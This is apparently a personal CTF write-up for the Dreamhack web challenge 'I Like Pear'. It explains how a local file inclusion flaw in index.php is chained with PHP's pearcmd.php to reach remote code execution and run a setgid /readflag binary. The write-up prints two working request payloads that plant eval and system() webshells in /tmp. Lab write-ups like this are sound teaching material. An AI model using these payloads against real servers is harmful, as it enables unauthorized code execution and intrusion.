---
title: "Dreamhack: I Like Pear 🍐"
date: 2025-08-12
tags:
  - web
  - ctf
  - pear
  - pearcmd
  - phpliteadmin
  - lfi2rce
draft: false
---

##### Link : [I_LIKE_PEAR](https://dreamhack.io/wargame/challenges/1733)

##### Description
```
Probably not the pear you're thinking of .. 🤔
```

##### Solve

Initially there's nothing shown on the first page.

![[Pasted image 20250812092619.png]]

The core of the analysis is chaining two vulnerabilities lying on the web.
1. Local File Inclusion(LFI) on `index.php` : We can load server-side local files using `include($_GET["file"]);` syntax. While it's filtering out various wrappers like `php://filter`, `http://`, it doesn't have any measure to protect direct access to local files with their names.
2. SetUID on `/readflag` : `Dockerfile` reveals that there's `readflag` binary which has 2555 permission. (`chmod 2555 /readflag`) While the web user `www-data` is not able to read `/flag.txt` (permission: 440) directly, it will be able to read the flag indirectly by executing `/readflag` command.

`index.php` :
```php
...

if(isset($_GET["file"])) {

if (preg_match("/^(file:|http:|ftp:|zlib:|data:|glob:|phar:|zip:|expect:|php:)/i", $_GET["file"])) {

die("HAHA... 😀");

}

include($_GET["file"]);

}
...
```

`Dockerfile` :
```
...

COPY flag.txt /flag.txt
COPY readflag.c /tmp/readflag.c

RUN chmod 440 /flag.txt
RUN gcc /tmp/readflag.c -o /readflag
RUN rm /tmp/readflag.c
RUN chmod 2555 /readflag

...
```

As mentioned on the description, "pear" seems to be somewhat related with the solve.
I googled for a while, and found the following;

- [PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/cd15d8596972e4c85bc03669404f6fa73131b98e/File%20Inclusion/LFI-to-RCE.md)

This introduces 4 different approaches to trigger RCE through LFI via PHP PEARCMD.
The first two might be easily work without external network connection.
Let me try both.

1. **Method 1**: config create
```bash
/vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
/vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
```

I used Burpsuite to capture the request to `/` and modified the path with the given path.
Also, I modified `eval($_GET['cmd'])` to direct `shell_exec()` command.

![[Pasted image 20250812103111.png]]

Then, I could retrieve the response of the command injection output (id).

![[Pasted image 20250812103454.png]]

2. **Method 2**: man_dir

```bash
/vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
/vuln.php?file=/tmp/exec.php&c=id
```

![[Pasted image 20250812103656.png]]

While the server response with complaints, the command injection worked.

![[Pasted image 20250812103735.png]]

With this, by adding command on `c` param, I can easily run `/readflag` command.

![[Pasted image 20250812103855.png]]